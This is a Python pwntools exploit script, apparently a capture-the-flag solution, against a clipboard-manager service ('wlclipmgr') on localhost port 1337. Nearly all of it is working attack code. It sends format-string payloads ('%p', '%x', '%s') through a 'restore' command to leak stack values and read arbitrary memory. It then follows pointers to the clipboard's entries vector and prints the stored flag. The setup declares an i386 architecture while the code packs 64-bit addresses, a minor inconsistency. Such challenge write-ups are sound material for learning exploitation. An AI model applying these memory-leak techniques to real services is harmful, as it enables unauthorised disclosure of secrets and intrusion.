#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 127.0.0.1 --port 1337
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='i386')
exe = './path/to/binary'

host = args.HOST or '127.0.0.1'
port = int(args.PORT or 1337)

def start(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def leak_stack(io, size):
    payload = b'restore -?' + f'%p_'.encode()*size
    io.sendline(payload)
    stack_values = io.readline().split(b'_')
    for idx, val in enumerate(stack_values):
        print(f'{idx} - {val}')
    return stack_values

def leak_at(io, addr):
    payload = b'restore ' + p64(addr) + b' -?'+ f'%x'.encode()*110
    io.sendline(payload + b'|%s|')
    return io.readline().split(b'|')[1]

def is_stack_addr(addr):
    return addr < 0x7fffffffffff and addr > 0x7f0000000000 and addr % 8 == 0

def check_if_clipboard(io, addr):
    '''
    In this function we exploit the fact, that the path of the clipboard must
    have 'wlclipmgr' in it. If we find it, that meens, that addr is &clipboard
    '''
    if not is_stack_addr(addr):
        return False

    #print(hex(addr))
    raw = leak_at(io, addr).ljust(8, b'\0')
    if len(raw) > 8:
        print(raw)
        return False

    new_addr = u64(raw)
    #print(hex(new_addr))
    if not is_stack_addr(new_addr):
        return False

    raw = leak_at(io, new_addr)
    #print(raw)
    if (b'/wlclipmgr/' in raw):
        log.success(f'Found &clipboard at {hex(addr)}')
        return True


def main(io):
    io.sendline(b'list')
    io.readlines(10)
    stack = leak_stack(io, 150)
    io.clean()

    # Find the clipboard pointer on the stack
    clipboard_addr = 0
    for stack_addr_raw in stack[10:-1]:
        stack_addr = int(stack_addr_raw.decode(), 16)
        if check_if_clipboard(io, stack_addr):
            clipboard_addr = stack_addr
            break

    if not clipboard_addr:
        log.error("Failed to find clipboard stack address")

    # Get the entries_ vector
    entries_offset = 10 # 2 Strings
    entries_vector_ptr = clipboard_addr + entries_offset*8

    entries_vector_addr = leak_at(io, entries_vector_ptr).ljust(8, b'\0')
    entries_vector_addr = u64(entries_vector_addr)
    log.info(hex(entries_vector_addr))

    # Get the first entry
    first_vector_element_offset = 4
    flag_entry_ptr = entries_vector_addr + first_vector_element_offset*8

    flag_entry_addr = leak_at(io, flag_entry_ptr).ljust(8, b'\0')
    flag_entry_addr = u64(flag_entry_addr)
    log.info(hex(flag_entry_addr))

    # Get the flag string
    flag_string_addr = leak_at(io, flag_entry_addr).ljust(8, b'\0')
    flag_string_addr = u64(flag_string_addr)

    flag = leak_at(io, flag_string_addr)
    log.success(flag.decode())

if __name__ == '__main__':
    io = start()
    main(io)
    io.interactive()
